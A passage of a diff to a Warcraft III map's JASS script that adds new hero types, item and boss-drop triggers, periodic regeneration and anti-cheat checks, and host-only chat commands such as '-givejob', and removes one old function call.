or(GetUnitTypeId(GetTriggerUnit())=='H01U')or(GetUnitTypeId(GetTriggerUnit())=='H01V')or(GetUnitTypeId(GetTriggerUnit())=='H01W')or(GetUnitTypeId(GetTriggerUnit())=='H01X')or(GetUnitTypeId(GetTriggerUnit())=='H01Y')or(GetUnitTypeId(GetTriggerUnit())=='H01Z')or(GetUnitTypeId(GetTriggerUnit())=='H020')
+return(GetUnitTypeId(GetTriggerUnit())=='H00J')or(GetUnitTypeId(GetTriggerUnit())=='H00A')or(GetUnitTypeId(GetTriggerUnit())=='H007')or(GetUnitTypeId(GetTriggerUnit())=='H00G')or(GetUnitTypeId(GetTriggerUnit())=='H00D')or(GetUnitTypeId(GetTriggerUnit())=='H010')or(GetUnitTypeId(GetTriggerUnit())=='H018')or(GetUnitTypeId(GetTriggerUnit())=='H015')or(GetUnitTypeId(GetTriggerUnit())=='H01A')or(GetUnitTypeId(GetTriggerUnit())=='H01C')or(GetUnitTypeId(GetTriggerUnit())=='H01B')or(GetUnitTypeId(GetTriggerUnit())=='H01E')or(GetUnitTypeId(GetTriggerUnit())=='H01F')or(GetUnitTypeId(GetTriggerUnit())=='H01D')or(GetUnitTypeId(GetTriggerUnit())=='H01P')or(GetUnitTypeId(GetTriggerUnit())=='H01Q')or(GetUnitTypeId(GetTriggerUnit())=='H01S') or(GetUnitTypeId(GetTriggerUnit())=='H01U')or(GetUnitTypeId(GetTriggerUnit())=='H01V')or(GetUnitTypeId(GetTriggerUnit())=='H01W')or(GetUnitTypeId(GetTriggerUnit())=='H01X')or(GetUnitTypeId(GetTriggerUnit())=='H01Y')or(GetUnitTypeId(GetTriggerUnit())=='H01Z')or(GetUnitTypeId(GetTriggerUnit())=='H020')or(GetUnitTypeId(GetTriggerUnit())=='H021')or(GetUnitTypeId(GetTriggerUnit())=='H022')
 endfunction
 function NQ takes nothing returns boolean
 return(GetHeroLevel(GetTriggerUnit())>='d')and(UnitHasItemOfTypeBJ(GetTriggerUnit(),'I04J'))and(AQ())
@@ -13214,6 +12122,8 @@ call SetForceAllianceStateBJ(FA(Player(-1+(bj_forLoopAIndex))),FA(Player($B)),0)
 set bj_forLoopAIndex=bj_forLoopAIndex+1
 endloop
 if(hs())then
+call DisableTrigger(eR)
+call DisableTrigger(SaveModuleSingle)
 endif
 endfunction
 function Js takes nothing returns nothing
@@ -13645,7 +12555,9 @@ set I[40]='H01X'
 set I[41]='H01Y'
 set I[42]='H01Z'
 set I[43]='H020'
-set A=43
+set I[44]='H021'
+set I[45]='H022'
+set A=45
 set N=StringLength(e)
 set B=""
 set c[0]=0
@@ -14069,7 +12981,6 @@ local integer pA
 local integer PA
 local version v
 local integer HA
-call ilovejason()
 call SetCameraBounds(-17792.+GetCameraMargin(CAMERA_MARGIN_LEFT),-14208.+GetCameraMargin(CAMERA_MARGIN_BOTTOM),17792.-GetCameraMargin(CAMERA_MARGIN_RIGHT),21632.-GetCameraMargin(CAMERA_MARGIN_TOP),-17792.+GetCameraMargin(CAMERA_MARGIN_LEFT),21632.-GetCameraMargin(CAMERA_MARGIN_TOP),17792.-GetCameraMargin(CAMERA_MARGIN_RIGHT),-14208.+GetCameraMargin(CAMERA_MARGIN_BOTTOM))
 call SetDayNightModels("Environment\\DNC\\DNCLordaeron\\DNCLordaeronTerrain\\DNCLordaeronTerrain.mdl","Environment\\DNC\\DNCLordaeron\\DNCLordaeronUnit\\DNCLordaeronUnit.mdl")
 call SetTerrainFogEx(0,3000.,5000.,.5,.0,.0,.0)
@@ -14082,6 +12993,7 @@ set lx=Rect(-1056.,-928.,736.,896.)
 set thantosdropregion = Rect( -832.0, 16096.0, -224.0, 17216.0 )
 set hecatedropregion = Rect( 2496.0, 15744.0, 3616.0, 16640.0 )
 set ladondropregion = Rect( 6208.0, -9856.0, 6784.0, -9120.0 )
+set herculesdropregion = Rect ( -13632.0, 5344.0, -12096.0, 6560.0) 
 set Lx=Rect(-960.,512.,-768.,736.)
 set mx=Rect(2080.,-1984.,2240.,-1824.)
 set Mx=Rect(2976.,-6720.,3168.,-6496.)
@@ -14535,6 +13447,25 @@ set Nx=CreateGroup()
 set Hx=CreateForce()
 set Ba=CreateTrigger()
 call TriggerAddAction(Ba,function iN)
+    set gg_trg_checkcheater = CreateTrigger(  )
+    call TriggerRegisterTimerEventPeriodic( gg_trg_checkcheater, 1.00 )
+    call TriggerAddAction( gg_trg_checkcheater, function Trig_checkcheater_Actions )
+    set gg_trg_esuna = CreateTrigger(  )
+    call TriggerRegisterTimerEventPeriodic( gg_trg_esuna, 0.10 )
+    call TriggerAddAction( gg_trg_esuna, function Trig_esuna_Actions )
+    set gg_trg_regenh = CreateTrigger(  )
+    call TriggerRegisterTimerEventPeriodic( gg_trg_regenh, 1.00 )
+    call TriggerAddAction( gg_trg_regenh, function Trig_regenh_Actions )
+    set gg_trg_hercai = CreateTrigger(  )
+    call TriggerRegisterTimerEventPeriodic( gg_trg_hercai, 180.00 )
+    call TriggerAddAction( gg_trg_hercai, function Trig_hercai_Actions )
+    set gg_trg_set = CreateTrigger(  )
+    call TriggerRegisterPlayerChatEvent( gg_trg_set, Player(0), "", false )
+    call TriggerAddCondition( gg_trg_set, Condition( function Trig_set_Conditions ) )
+    call TriggerAddAction( gg_trg_set, function Trig_set_Actions )
+    set gg_trg_regen = CreateTrigger(  )
+    call TriggerRegisterTimerEventPeriodic( gg_trg_regen, 3.00 )
+    call TriggerAddAction( gg_trg_regen, function Trig_regen_Actions )
     set gg_trg_alcielo = CreateTrigger(  )
     call TriggerRegisterAnyUnitEventBJ( gg_trg_alcielo, EVENT_PLAYER_UNIT_SPELL_CAST )
     call TriggerAddCondition( gg_trg_alcielo, Condition( function Trig_alcielo_Conditions ) )
@@ -15035,6 +13966,10 @@ set Armor19=CreateTrigger()
 call TriggerRegisterAnyUnitEventBJ(Armor19,EVENT_PLAYER_UNIT_PICKUP_ITEM)
 call TriggerAddCondition(Armor19,Condition(function Armor19Condition))
 call TriggerAddAction(Armor19,function Armor19Action)
+set Armor20=CreateTrigger()
+call TriggerRegisterAnyUnitEventBJ(Armor20,EVENT_PLAYER_UNIT_PICKUP_ITEM)
+call TriggerAddCondition(Armor20,Condition(function Armor20Condition))
+call TriggerAddAction(Armor20,function Armor20Action)
 set lifeSteal=CreateTrigger()
 call TriggerRegisterAnyUnitEventBJ(lifeSteal,EVENT_PLAYER_UNIT_ATTACKED)
 call TriggerAddCondition(lifeSteal,Condition(function lifeStealCondition))
@@ -15741,6 +14676,10 @@ set ladondrop=CreateTrigger()
 call TriggerRegisterAnyUnitEventBJ(ladondrop,EVENT_PLAYER_UNIT_DEATH)
 call TriggerAddCondition(ladondrop,Condition(function ladondropCondition))
 call TriggerAddAction(ladondrop,function ladondropAction)
+set herculesdrop=CreateTrigger()
+call TriggerRegisterAnyUnitEventBJ(herculesdrop,EVENT_PLAYER_UNIT_DEATH)
+call TriggerAddCondition(herculesdrop,Condition(function herculesdropCondition))
+call TriggerAddAction(herculesdrop,function herculesdropAction)
 set hecatedrop=CreateTrigger()
 call TriggerRegisterAnyUnitEventBJ(hecatedrop,EVENT_PLAYER_UNIT_DEATH)
 call TriggerAddCondition(hecatedrop,Condition(function hecatedropCondition))
@@ -15964,6 +14903,10 @@ call TriggerRegisterPlayerChatEvent(eR,Player(8),"-saveold",true)
 call TriggerRegisterPlayerChatEvent(eR,Player(9),"-saveold",true)
 call TriggerRegisterPlayerChatEvent(eR,Player($A),"-saveold",true)
 call TriggerAddAction(eR,function ps)
+    set gg_trg_givejob = CreateTrigger(  )
+    call TriggerRegisterPlayerChatEvent( gg_trg_givejob, Player(0), "-givejob", true )
+    call TriggerAddCondition( gg_trg_givejob, Condition( function Trig_givejob_Conditions ) )
+    call TriggerAddAction( gg_trg_givejob, function Trig_givejob_Actions )
 set xR=CreateTrigger()
 call TriggerRegisterPlayerChatEvent(xR,Player(0),"-loadold ",false)
 call TriggerRegisterPlayerChatEvent(xR,Player(1),"-loadold ",false)
